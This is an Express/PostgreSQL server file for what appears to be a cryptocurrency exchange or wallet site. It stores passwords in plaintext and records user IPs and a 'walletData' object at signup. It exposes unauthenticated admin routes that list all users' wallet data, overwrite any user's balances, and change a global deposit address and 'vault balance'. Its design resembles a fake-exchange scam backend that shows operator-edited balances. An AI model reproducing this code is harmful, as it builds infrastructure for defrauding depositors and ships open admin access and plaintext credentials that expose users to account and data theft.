import express from 'express';
import cors from 'cors';
import pg from 'pg';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = 5000;
const { Pool } = pg;

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

app.use(cors());
app.use(express.json());

// Database Initialization
pool.query(`
  CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY,
    email TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    wallet_data JSONB DEFAULT '{}'::jsonb,
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip_address TEXT
  );
  
  CREATE TABLE IF NOT EXISTS system_config (
    key TEXT PRIMARY KEY,
    value JSONB
  );
  
  INSERT INTO system_config (key, value) VALUES ('global', '{"vault_balance": "25,000.00", "deposit_address": "0xcDEC8d41f2acCCA50064F24A089fC3F52Fadedd0"}'::jsonb) ON CONFLICT DO NOTHING;
`).catch(console.error);

const ASSET_ID_MAP = {
    'BTC': 'bitcoin', 'ETH': 'ethereum', 'SOL': 'solana', 'DOT': 'polkadot',
    'USDT': 'tether', 'BNB': 'binance-coin', 'XRP': 'xrp', 'ADA': 'cardano',
    'DOGE': 'dogecoin', 'MATIC': 'polygon', 'AVAX': 'avalanche',
    'LINK': 'chainlink', 'KSM': 'kusama'
};

app.get('/api/health', (req, res) => res.json({ status: 'ok' }));

app.get('/api/config', async (req, res) => {
  try {
    const result = await pool.query("SELECT value FROM system_config WHERE key = 'global'");
    res.json(result.rows[0]?.value || {});
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/config', async (req, res) => {
  try {
    await pool.query("UPDATE system_config SET value = $1 WHERE key = 'global'", [JSON.stringify(req.body)]);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/binance/prices', async (req, res) => {
  try {
    const response = await fetch('https://api.coincap.io/v2/assets?limit=100');
    if (response.ok) {
      const data = await response.json();
      const mapped = data.data.map(asset => ({
        symbol: `${asset.symbol}USDT`,
        lastPrice: asset.priceUsd,
        priceChangePercent: asset.changePercent24Hr
      }));
      // Add KSM explicitly if not in top 100 or to ensure it matches
      if (!mapped.find(m => m.symbol === 'KSMUSDT')) {
        const ksm = data.data.find(a => a.symbol === 'KSM');
        if (ksm) mapped.push({ symbol: 'KSMUSDT', lastPrice: ksm.priceUsd, priceChangePercent: ksm.changePercent24Hr });
      }
      return res.json(mapped);
    }
  } catch (e) { console.error('Price fetch error:', e.message); }
  res.json([{ symbol: 'BTCUSDT', lastPrice: '96405.00', priceChangePercent: '1.45' }]);
});

app.get('/api/binance/klines', async (req, res) => {
  try {
    const { symbol } = req.query;
    const symbolStr = typeof symbol === 'string' ? symbol : 'BTCUSDT';
    const id = ASSET_ID_MAP[symbolStr.replace('USDT', '')] || 'bitcoin';
    const response = await fetch(`https://api.coincap.io/v2/assets/${id}/history?interval=m15`);
    const data = await response.json();
    const klines = data.data
      .map(d => [parseInt(d.time), d.priceUsd, d.priceUsd, d.priceUsd, d.priceUsd, "0", parseInt(d.time) + 900000])
      .sort((a, b) => a[0] - b[0]);
    return res.json(klines);
  } catch (error) { res.status(500).json({ error: 'Failed to fetch klines' }); }
});

app.post('/api/auth/signup', async (req, res) => {
  const { email, password, walletData } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  try {
    const result = await pool.query(
      'INSERT INTO users (email, password, wallet_data, ip_address) VALUES ($1, $2, $3, $4) RETURNING *',
      [email, password, JSON.stringify(walletData), ip]
    );
    res.json({ success: true, user: result.rows[0] });
  } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  try {
    const result = await pool.query(
      'UPDATE users SET last_seen = CURRENT_TIMESTAMP, ip_address = $1 WHERE email = $2 AND password = $3 RETURNING *',
      [ip, email, password]
    );
    if (result.rows.length > 0) res.json({ success: true, user: result.rows[0] });
    else res.status(401).json({ success: false, error: 'Invalid credentials' });
  } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

app.get('/api/admin/users', async (req, res) => {
  try {
    const result = await pool.query('SELECT id, email, wallet_data, last_seen, ip_address FROM users ORDER BY last_seen DESC NULLS LAST');
    res.json(result.rows);
  } catch (error) { res.status(500).json({ error: error.message }); }
});

app.get('/api/user/data', async (req, res) => {
  const { email } = req.query;
  try {
    const result = await pool.query('SELECT wallet_data FROM users WHERE email = $1', [email]);
    if (result.rows.length > 0) {
      res.json(result.rows[0].wallet_data);
    } else {
      res.status(404).json({ error: 'User not found' });
    }
  } catch (error) { res.status(500).json({ error: error.message }); }
});

app.post('/api/admin/users/update', async (req, res) => {
  const { id, wallet_data } = req.body;
  try {
    await pool.query('UPDATE users SET wallet_data = $1 WHERE id = $2', [JSON.stringify(wallet_data), id]);
    res.json({ success: true });
  } catch (error) { res.status(500).json({ error: error.message }); }
});

const distPath = path.join(__dirname, 'dist');
app.use(express.static(distPath));

// Standard SPA catch-all - robust error handling
app.get('*', (req, res) => {
  if (req.path.startsWith('/api')) {
    return res.status(404).json({ error: 'API route not found' });
  }
  // For web previews on Replit, we serve from the current directory if dist is not built
  const indexPath = path.join(distPath, 'index.html');
  if (req.accepts('html')) {
    res.sendFile(indexPath, (err) => {
      if (err) {
        res.sendFile(path.join(__dirname, 'index.html'), (err2) => {
          if (err2) {
            res.status(500).send("Critical System Error: index.html not found.");
          }
        });
      }
    });
  } else {
    res.status(404).send('Not Found');
  }
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Unified Server running on port ${port}`);
});
